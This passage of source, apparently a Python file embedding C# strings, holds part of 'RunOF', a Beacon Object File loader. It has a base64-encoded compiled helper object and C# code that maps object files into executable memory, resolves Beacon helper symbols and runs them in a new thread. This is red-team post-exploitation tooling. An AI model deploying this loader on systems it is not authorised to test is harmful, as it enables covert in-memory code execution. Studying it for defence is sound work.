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AAApBAAAAAAAAAAAAAACAAAAAAA7BAAAAAAAAAAAAAACAAAAAABjBAAAAAAAAAAAAAACAAAAAACHBAAAAAAAAAAAAAACAAAAAACeBAAAAAAAAAAAAAACAMEEAAAucmRhdGEkenp6AFZlY3RvcmVkRXhjZXB0aW9uSGFuZGxlcgBkZWJ1Z1ByaW50ZgBnb193cmFwcGVyAFJlYWxsb2NPdXRwdXRCdWZmZXIAQmVhY29uUHJpbnRmAEJlYWNvbk91dHB1dABCZWFjb25EYXRhUGFyc2UAQmVhY29uRGF0YUxlbmd0aABCZWFjb25EYXRhRXh0cmFjdABCZWFjb25EYXRhSW50AEJlYWNvbkRhdGFTaG9ydABfcmVhbGxvY0Zvcm1hdEJ1ZmZlcgBCZWFjb25Gb3JtYXRBbGxvYwBCZWFjb25Gb3JtYXRSZXNldABCZWFjb25Gb3JtYXRGcmVlAEJlYWNvbkZvcm1hdEFwcGVuZABCZWFjb25Gb3JtYXRQcmludGYAQmVhY29uRm9ybWF0VG9TdHJpbmcAQmVhY29uRm9ybWF0SW50AEJlYWNvblVzZVRva2VuAEJlYWNvblJldmVydFRva2VuAEJlYWNvbklzQWRtaW4AdG9XaWRlQ2hhcgAucmRhdGEkenp6AGdsb2JhbF9idWZmZXIAZ2xvYmFsX2J1ZmZlcl9jdXJzb3IAZ2xvYmFsX2J1ZmZlcl9sZW4AZ2xvYmFsX2J1ZmZlcl9yZW1haW5pbmcAYXJndW1lbnRfYnVmZmVyAGFyZ3VtZW50X2J1ZmZlcl9sZW5ndGgAZ2xvYmFsX2RlYnVnX2ZsYWcAdGhyZWFkX2hhbmRsZQBlbXB0eV9zdHJpbmcAX19pbXBfTVNWQ1JUJHByaW50ZgBfX2ltcF9LRVJORUwzMiRMb2FkTGlicmFyeUEAX19pbXBfTlRETEwkUnRsTnRTdGF0dXNUb0Rvc0Vycm9yAF9faW1wX0Zvcm1hdE1lc3NhZ2VBAF9faW1wX0tFUk5FTDMyJFRlcm1pbmF0ZVRocmVhZABfX2ltcF9NU1ZDUlQkdnByaW50ZgBfX2ltcF9LRVJORUwzMiRBZGRWZWN0b3JlZEV4Y2VwdGlvbkhhbmRsZXIAX19pbXBfS0VSTkVMMzIkUmVtb3ZlVmVjdG9yZWRFeGNlcHRpb25IYW5kbGVyAF9faW1wX0tFUk5FTDMyJEV4aXRUaHJlYWQAX19pbXBfS0VSTkVMMzIkR2V0UHJvY2Vzc0hlYXAAX19pbXBfS0VSTkVMMzIkSGVhcFJlQWxsb2MAX19pbXBfTVNWQ1JUJHZzbnByaW50ZgBfX2ltcF9NU1ZDUlQkc3RybGVuAF9faW1wX01TVkNSVCRfc25wcmludGYAX19pbXBfTVNWQ1JUJG1lbWNweQBfX2ltcF9NU1ZDUlQkcmVhbGxvYwBfX2ltcF9NU1ZDUlQkY2FsbG9jAF9faW1wX01TVkNSVCRmcmVlAF9faW1wX01TVkNSVCRfdnNjcHJpbnRmAF9faW1wX01TVkNSVCRwdXRzAF9faW1wX0FEVkFQSTMyJEFsbG9jYXRlQW5kSW5pdGlhbGl6ZVNpZABfX2ltcF9BRFZBUEkzMiRDaGVja1Rva2VuTWVtYmVyc2hpcABfX2ltcF9BRFZBUEkzMiRGcmVlU2lkAF9faW1wX0tFUk5FTDMyJE11bHRpQnl0ZVRvV2lkZUNoYXIA";

				byte[] beacon_funcs = Convert.FromBase64String(beacon_funcs_b64);

				try
				{
					this.beacon_helper = new Coff(beacon_funcs, this.iat);

				}
				catch (Exception e)
				{
					Log($"Hit exception while initalizing this.beacon_helper: {e}");
					throw e;
				}

				var ser = parsed_args.SerialiseArgs();

				Log($"[Args] size={ser.Length} b64={Convert.ToBase64String(ser)}");

				Log($"[Args HEX] {BitConverter.ToString(ser)}");            // AA-BB-CC...
																			// If it's huge, limit it:
				Log($"[Args HEX first 256B] {BitConverter.ToString(ser, 0, Math.Min(ser.Length, 256))}");

				Log($"Checking required arguments: serialised args: {parsed_args.SerialiseArgs()}, debug: {parsed_args.debug}");
				this.entry_point = this.beacon_helper.ResolveHelpers(parsed_args.SerialiseArgs(), parsed_args.debug);

				this.beacon_helper.SetPermissions();
			}
			catch (Exception ex)
			{
				Log($"Hit exception while Initalizing BOF Runner {ex}");
			}

		}

		public void LoadBof()
		{

			Log("Loading boff object...");
			this.bof = new Coff(this.parsed_args.file_bytes, this.iat);
			Log($"Loaded BOF with entry {this.entry_point.ToInt64():X}");
			this.bof.StitchEntry(this.parsed_args.entry_name);

			this.bof.SetPermissions();
		}

		public BofRunnerOutput RunBof(uint timeout)
		{
			Log($"Starting bof in new thread @ {this.entry_point.ToInt64():X}");
			Log(" --- MANAGED CODE END --- ");
			IntPtr hThread = NativeDeclarations.CreateThread(IntPtr.Zero, 0, this.entry_point, IntPtr.Zero, 0, IntPtr.Zero);
			var resp = NativeDeclarations.WaitForSingleObject(hThread, (uint)(timeout));

			if (resp == (uint)NativeDeclarations.WaitEventEnum.WAIT_TIMEOUT)
			{
			   Log($"BOF timed out after {timeout / 1000} seconds");
			}

			Console.Out.Flush();
			Log(" --- MANAGED CODE START --- ");

			int ExitCode;

			NativeDeclarations.GetExitCodeThread(hThread, out ExitCode);

			
			if (ExitCode < 0)
			{
				Log($"Bof thread exited with code {ExitCode} - see above for exception information. ");

			}

			var output_addr = Marshal.ReadIntPtr(beacon_helper.global_buffer);
			var output_size = Marshal.ReadInt32(beacon_helper.global_buffer_size_ptr);

			Log($"Output buffer size {output_size} located at {output_addr.ToInt64():X}");

			List<byte> output = new List<byte>();

			byte c;
			int i = 0;
			while ((c = Marshal.ReadByte(output_addr + i)) != '\\0' && i < output_size) {
				output.Add(c);
				i++;
			}

			BofRunnerOutput Response = new BofRunnerOutput();

			Response.Output = Encoding.ASCII.GetString(output.ToArray());
			Response.ExitCode = ExitCode;

			ClearMemory();

			return Response;
			
		}

		private void ClearMemory()
		{
			this.beacon_helper.Clear();
			this.bof.Clear();
			this.iat.Clear();

		}
	}

	class BofRunnerOutput
	{
		internal string Output;
		internal int ExitCode;
	}
}
"""

COFF_CS = """
using RunOF.Internals;
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using static RunOF.Program;
using System.Text;

namespace RunOF.Internals
{
	class Coff
	{
		private IMAGE_FILE_HEADER file_header;
		private List<IMAGE_SECTION_HEADER> section_headers;
		const uint IMAGE_SCN_CNT_UNINITIALIZED_DATA = 0x00000080;
		private List<IMAGE_SYMBOL> symbols;
		private long string_table;
		internal IntPtr base_addr;
		internal int size;
		private MemoryStream stream;
		private BinaryReader reader;
		private ARCH MyArch;
		private ARCH BofArch;
		private string ImportPrefix;
		private string HelperPrefix;
		private string EntryWrapperSymbol = "go_wrapper";
		private string EntrySymbol = "go";
		private List<Permissions> permissions = new List<Permissions>();
		//private IntPtr iat;
		private IAT iat;
		public IntPtr global_buffer { get; private set; }
		public IntPtr global_buffer_size_ptr {get; private set;}
		public int global_buffer_size { get; set; } = 2000000;
		public IntPtr argument_buffer { get; private set; }
		public int argument_buffer_size { get; set; }
		private string InternalDLLName { get; set; } = "RunOF";

		private enum ARCH: int 
		{
			I386 = 0,
			AMD64 = 1
		}

		public Coff(byte[] file_contents, IAT iat)
		{
			try
			{
				Log($"--- Loading object file from byte array ---");

				if (iat != null)
				{
					this.iat = iat;
					Log("Set this.iat to IAT");
				}
				else
				{
					this.iat = new IAT();
					Log("This.iat is Null");
				}

				this.MyArch = Environment.Is64BitProcess ? ARCH.AMD64 : ARCH.I386;
				Log("Set the arch for running Cof");

				// do some field setup
				this.stream = new MemoryStream(file_contents);
				Log("Initalized this.stream onto file_contents");
				this.reader = new BinaryReader(this.stream);
				Log("Set this.reader to new binaryreader onto this.stream");

				this.section_headers = new List<IMAGE_SECTION_HEADER>();
				Log("Set section_headers to image section header");
				this.symbols = new List<IMAGE_SYMBOL>();
				Log("Set this.symbols to Image symbol");

				// Allocate some memory, for now just the whole size of the object file. 
				// TODO - could just do the memory for the sections and not the header?
				// TODO - memory permissions


				// copy across
				//Marshal.Copy(file_contents, 0, base_addr, file_contents.Length);

				// setup some objects to help us understand the file
				this.file_header = Deserialize<IMAGE_FILE_HEADER>(file_contents);
				Log("Set file header");

				// check the architecture
				Log($"Got file header. Architecture {this.file_header.Machine}");

				if (!ArchitectureCheck())
				{
					Log($"Object file architecture {this.BofArch} does not match process architecture {this.MyArch}");
					throw new NotImplementedException();
				}

				Log("Passed arch check");

				// Compilers use different prefixes to symbols depending on architecture. 
				// There might be other naming conventions for functions imported in different ways, but I'm not sure.
				if (this.BofArch == ARCH.I386)
				{
					this.ImportPrefix = "__imp__";
					this.HelperPrefix = "_"; // This I think means a global function
				}
				else if (this.BofArch == ARCH.AMD64)
				{
					this.ImportPrefix = "__imp_";
					this.HelperPrefix = String.Empty;
				}

				if (this.file_header.SizeOfOptionalHeader != 0)
				{
					Log($"[x] Bad object file: has an optional header??");
					throw new Exception("Object file had an optional header, not standards-conforming");
				}

				// Setup our section header list.
				Log($"Parsing {this.file_header.NumberOfSections} section headers");
				FindSections();

				Log($"Parsing {this.file_header.NumberOfSymbols} symbols");
				FindSymbols();

				// The string table has specified offset, it's just located directly after the last symbol header - so offset is sym_table_offset + (num_symbols * sizeof(symbol))
				Log($"Setting string table offset to 0x{(this.file_header.NumberOfSymbols * Marshal.SizeOf(typeof(IMAGE_SYMBOL))) + this.file_header.PointerToSymbolTable:X}");
				this.string_table = (this.file_header.NumberOfSymbols * Marshal.SizeOf(typeof(IMAGE_SYMBOL))) + this.file_header.PointerToSymbolTable;

				// We allocate and copy the file into memory once we've parsed all our section and string information
				// This is so we can use the section information to only map the stuff we need

				//size = (uint)file_contents.Length;

				// because we need to page align our sections, the overall size may be larger than the filesize
				// calculate our overall size here
				int total_pages = 0;
				foreach (var section_header in this.section_headers)
				{
					int section_pages = (int)section_header.SizeOfRawData / Environment.SystemPageSize;
					if (section_header.SizeOfRawData % Environment.SystemPageSize != 0)
					{
						section_pages++;
					}

					total_pages = total_pages + section_pages;
				}

				Log($"We need to allocate {total_pages} pages of memory");
				size = total_pages * Environment.SystemPageSize;

				base_addr = NativeDeclarations.VirtualAlloc(IntPtr.Zero, (uint)(total_pages * Environment.SystemPageSize), NativeDeclarations.MEM_RESERVE, NativeDeclarations.PAGE_EXECUTE_READWRITE);
				Log($"Mapped image base @ 0x{base_addr.ToInt64():x}");
				int num_pages = 0;

				for (int i =0; i<this.section_headers.Count; i++ )
				{
					var section_header = section_headers[i];
					Log($"Section {Encoding.ASCII.GetString(section_header.Name)} @ {section_header.PointerToRawData:X} sized {section_header.SizeOfRawData:X}");
					if (section_header.SizeOfRawData != 0)
					{
						// how many pages will this section take up?
						int section_pages = (int)section_header.SizeOfRawData / Environment.SystemPageSize;
						// round up
						if (section_header.SizeOfRawData % Environment.SystemPageSize != 0)
						{
							section_pages++;
						}
						Log($"This section needs {section_pages} pages");
						// we allocate section_pages * pagesize bytes
						var addr = NativeDeclarations.VirtualAlloc(IntPtr.Add(this.base_addr, num_pages * Environment.SystemPageSize), (uint)(section_pages * Environment.SystemPageSize), NativeDeclarations.MEM_COMMIT, NativeDeclarations.PAGE_EXECUTE_READWRITE);
						num_pages+=section_pages;
						//Log($"Copying section to 0x{addr.ToInt64():X}");

						Log($"Copying section to 0x{addr.ToInt64():X}");

						// --- SAFE COPY GUARDING ---
						int srcOffset = unchecked((int)section_header.PointerToRawData);
						int copyLen   = unchecked((int)section_header.SizeOfRawData);

						// Treat .bss (uninitialized data): no raw bytes to read from the file
						bool isBss = (section_header.Characteristics & IMAGE_SCN_CNT_UNINITIALIZED_DATA) != 0;

						if (isBss || copyLen == 0 || srcOffset == 0 && isBss)
						{
    						Log("Skipping copy: BSS/uninitialized data (memory is already zeroed).");
						}
						else
						{
    						// Bounds check against the file buffer
    						if (srcOffset < 0 || srcOffset > file_contents.Length)
    						{
        						Log($"Skipping copy: srcOffset {srcOffset} is outside file (len {file_contents.Length}).");
    						}
    						else
    						{
        						int bytesAvailable = file_contents.Length - srcOffset;
        						if (copyLen > bytesAvailable)
        						{
            						Log($"Truncating copy from {copyLen} to {bytesAvailable} (end of file).");
            						copyLen = bytesAvailable;
        						}

        						if (copyLen > 0)
        						{
            						Marshal.Copy(file_contents, srcOffset, addr, copyLen);
        						}
        						else
        						{
            						Log("Nothing to copy after bounds check.");
        						}
    						}
						}

						Log($"Updating section ptrToRawData to {(addr.ToInt64() - this.base_addr.ToInt64()):X}");
						var new_hdr = section_headers[i];
						new_hdr.PointerToRawData = (uint)(addr.ToInt64() - this.base_addr.ToInt64());
						section_headers[i] = new_hdr;

						/*// but we only copy sizeofrawdata (which will almost always be less than the amount we allocated)
						Marshal.Copy(file_contents, (int)section_header.PointerToRawData, addr, (int)section_header.SizeOfRawData);
						Log($"Updating section ptrToRawData to {(addr.ToInt64() - this.base_addr.ToInt64()):X}");
						// We can't directly modify the section header in the list as it's a struct. 
						// TODO - look at using an array rather than a list
						// for now, replace it with a new struct with the new offset
						var new_hdr = section_headers[i];
						new_hdr.PointerToRawData = (uint)(addr.ToInt64() - this.base_addr.ToInt64());
						section_headers[i] = new_hdr;*/

						// because we change the section header entry to have our new address, it's hard to work out later what permissions apply to what memory pages
						// so we record that in this list for future use (post-relocations and patching)
						permissions.Add(new Permissions(addr, section_header.Characteristics, num_pages * Environment.SystemPageSize, Encoding.ASCII.GetString(section_header.Name)));

					}
				}

				

				// Process relocations
				Log("Processing relocations...");
				section_headers.ForEach(ResolveRelocs);


				// Compilers use different prefixes to symbols depending on architecture. 
				// There might be other naming conventions for functions imported in different ways, but I'm not sure.
				if (this.BofArch == ARCH.I386)
				{
					this.ImportPrefix = "__imp__";
					this.HelperPrefix = "_"; // This I think means a global function
					this.EntrySymbol = "_go";
				}
				else if (this.BofArch == ARCH.AMD64)
				{
					this.ImportPrefix = "__imp_";
					this.EntrySymbol = "go";
					this.HelperPrefix = String.Empty;
				}
			}
			catch (Exception e)
			{
				//Logger.Error($"Unable to load object file - {e}");
				throw (e);
			}

		}

		public void SetPermissions()
		{
			// how do we know if we allocated this section?
			foreach (var perm in this.permissions)
			{


				bool x = (perm.Characteristics & NativeDeclarations.IMAGE_SCN_MEM_EXECUTE) != 0;
				bool r = (perm.Characteristics & NativeDeclarations.IMAGE_SCN_MEM_READ) != 0;
				bool w = (perm.Characteristics & NativeDeclarations.IMAGE_SCN_MEM_WRITE) != 0;
				uint page_permissions = 0;

				if (x & r & w) page_permissions = NativeDeclarations.PAGE_EXECUTE_READWRITE;
				if (x & r & !w) page_permissions = NativeDeclarations.PAGE_EXECUTE_READ;
				if (x & !r & !w) page_permissions = NativeDeclarations.PAGE_EXECUTE;

				if (!x & r & w) page_permissions = NativeDeclarations.PAGE_READWRITE;
				if (!x & r & !w) page_permissions = NativeDeclarations.PAGE_READONLY;
				if (!x & !r & !w) page_permissions = NativeDeclarations.PAGE_NOACCESS;

				if (page_permissions == 0)
				{
					throw new Exception($"Unable to parse section memory permissions for section {perm.SectionName}: 0x{perm.Characteristics:x}");
				}

				//Logger.Debug($"Setting permissions for section {perm.SectionName} @ {perm.Addr.ToInt64():X} to R: {r}, W: {w}, X: {x}");

				NativeDeclarations.VirtualProtect(perm.Addr, (UIntPtr)(perm.Size), page_permissions, out _);
				
			}

		}

		public IntPtr ResolveHelpers(byte[] serialised_args, bool debug)
		{
			Log("Looking for beacon helper functions");

			Log($"Checking required arguments: serialised args: {serialised_args}, debug: {debug}");
			bool global_buffer_found = false;
			bool global_buffer_len_found = false;
			bool argument_buffer_found = false;
			bool argument_buffer_length_found = false;
			IntPtr entry_addr = IntPtr.Zero;

			foreach (var symbol in this.symbols) 
			{
				var symbol_name = GetSymbolName(symbol);
				if ((symbol_name.StartsWith(this.HelperPrefix+"Beacon") || symbol_name.StartsWith(this.HelperPrefix + "toWideChar")) && symbol.Type == IMAGE_SYMBOL_TYPE.IMAGE_SYM_TYPE_FUNC)
				{
					var symbol_addr = new IntPtr(this.base_addr.ToInt64() + symbol.Value + this.section_headers[(int)symbol.SectionNumber - 1].PointerToRawData);

					Log($"\tFound helper function {symbol_name} - {symbol.Value}");
					Log($"\t[=] Address: {symbol_addr.ToInt64():X}");
					this.iat.Add(this.InternalDLLName, symbol_name.Replace("_", string.Empty), symbol_addr);
				}
				else if (symbol_name == this.HelperPrefix+"global_buffer")
				{

					var heap_handle = NativeDeclarations.GetProcessHeap();
					var mem = NativeDeclarations.HeapAlloc(heap_handle, (uint)NativeDeclarations.HeapAllocFlags.HEAP_ZERO_MEMORY, (uint)this.global_buffer_size);
					this.global_buffer = NativeDeclarations.VirtualAlloc(IntPtr.Zero, (uint)this.global_buffer_size, NativeDeclarations.MEM_COMMIT, NativeDeclarations.PAGE_READWRITE);
					Log($"Allocated a {this.global_buffer_size} bytes global buffer @ {mem.ToInt64():X}");

					var symbol_addr = new IntPtr(this.base_addr.ToInt64() + symbol.Value + this.section_headers[(int)symbol.SectionNumber - 1].PointerToRawData);

					Log("Found global buffer");
					Log($"\t[=] Address: {symbol_addr.ToInt64():X}");
					//write the address of the global buffer we allocated to allow it to move around (e.g. realloc)
					Marshal.WriteIntPtr(symbol_addr, mem);
					this.global_buffer = symbol_addr;
					// save the location of our global_buffer_ptr

					global_buffer_found = true;
				}
				else if (symbol_name == this.HelperPrefix + "argument_buffer")
				{
					if (serialised_args.Length > 0)
					{
						Log($"Allocating argument buffer of length {serialised_args.Length}");
						this.argument_buffer = NativeDeclarations.VirtualAlloc(IntPtr.Zero, (uint)serialised_args.Length, NativeDeclarations.MEM_COMMIT, NativeDeclarations.PAGE_READWRITE);
						// Copy our data into it 
						Marshal.Copy(serialised_args, 0, this.argument_buffer, serialised_args.Length);

						var symbol_addr = new IntPtr(this.base_addr.ToInt64() + symbol.Value + this.section_headers[(int)symbol.SectionNumber - 1].PointerToRawData);
						Marshal.WriteIntPtr(symbol_addr, this.argument_buffer);
					} // TODO - leave dangling if don't have any arguments? A little dangerous, but our code should check the length first....
					argument_buffer_found = true;

				}
				else if (symbol_name == this.HelperPrefix + "argument_buffer_length")
				{
					Log($"Setting argument length to {(uint)serialised_args.Length}");
					this.argument_buffer_size = serialised_args.Length;

					var symbol_addr = new IntPtr(this.base_addr.ToInt64() + symbol.Value + this.section_headers[(int)symbol.SectionNumber - 1].PointerToRawData);
					// CAUTION - the sizeo of what you write here MUST match the definition in beacon_funcs.h for argument_buffer_len (currently a uint32_t)

					Marshal.WriteInt32(symbol_addr, this.argument_buffer_size);
